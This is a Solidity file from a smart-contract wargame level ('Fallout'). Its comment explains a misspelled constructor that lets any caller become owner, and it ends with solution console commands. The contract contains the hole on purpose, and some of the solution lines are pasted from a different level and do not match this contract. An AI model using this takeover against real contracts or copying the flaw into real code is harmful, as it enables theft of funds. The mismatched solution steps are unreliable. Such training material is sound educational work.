
/*
To beat this level 

We need to become the contract's owner.

Hint : Paste this contract in Solidity Remix IDE.


In the below contract there is only one place where the state variable owner is assigned. That is inside the constructor. If we paste this contract
on Remix and observe clearly, the constructor (In solidity earlier versions a function with it's name same as contract name was considered a constructor.
But, it's not the case with latest versions.) name is misspelled as Fal1out. As the function name is different from the contract name this won't be executed
as a constructor. The Fal1out is a public and payable function. who ever calls it can become the owner of the contract based on it's logic.

We can call Fal1out function to become the owner of the contract and win the game.


---------------------------------------------------SOLUTION----------------------------------------------------------
// send value to the contract using the below commands to become owner

await contract.contrbute({value: 1})
await contract.sendTransaction({value: 1})

These two satisifes the checks in the fall back and make the caller's address as owner.

// To withdraw the funds from the contract

await contract.withdraw()

---------------------------------------------****************------------------------------------------------------

await contract.fal1out()

---------------------------------------------****************------------------------------------------------------




*/







// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}